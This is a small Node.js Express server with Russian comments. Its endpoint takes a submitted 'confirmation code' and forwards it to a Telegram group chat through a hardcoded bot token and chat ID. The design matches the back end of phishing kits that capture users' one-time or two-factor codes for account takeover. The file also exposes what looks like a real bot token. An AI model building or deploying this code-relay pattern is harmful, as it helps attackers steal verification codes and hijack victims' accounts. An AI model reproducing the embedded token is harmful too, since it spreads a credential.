const express = require('express');
const fetch = require('node-fetch'); // Для отправки запросов
const bodyParser = require('body-parser');

const app = express();
const port = 3000; // Порт для сервера

// Токен Telegram-бота и ID чата
const botToken = '7584473430:AAEIiKWC8QLTvXsL5t5PpdCMum4UkOZaMoM'; // Ваш токен
const chatId = '-4702734460'; // Ваш ID чата

// Настройка middlewares
app.use(bodyParser.json()); // Для обработки JSON данных

// Эндпоинт для получения кода и отправки сообщения в Telegram
app.post('/send-code', (req, res) => {
    const { code } = req.body; // Получаем код из тела запроса

    if (!code) {
        return res.status(400).json({ error: 'Код подтверждения обязателен' });
    }

    const message = `Код подтверждения: ${code}`;
    console.log(`Отправка сообщения: ${message}`);

    // Формируем URL для API Telegram
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    console.log(`URL для запроса: ${url}`);

    // Отправляем запрос в Telegram
    fetch(url)
        .then(response => response.json())
        .then(data => {
            console.log('Ответ от Telegram:', data); // Логируем ответ
            if (data.ok) {
                res.status(200).json({ success: true, message: 'Сообщение успешно отправлено' });
            } else {
                res.status(500).json({ error: 'Ошибка при отправке сообщения' });
            }
        })
        .catch(error => {
            console.error('Ошибка при отправке запроса:', error);
            res.status(500).json({ error: 'Ошибка при соединении с Telegram', details: error.message });
        });
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Сервер запущен на http://localhost:${port}`);
});
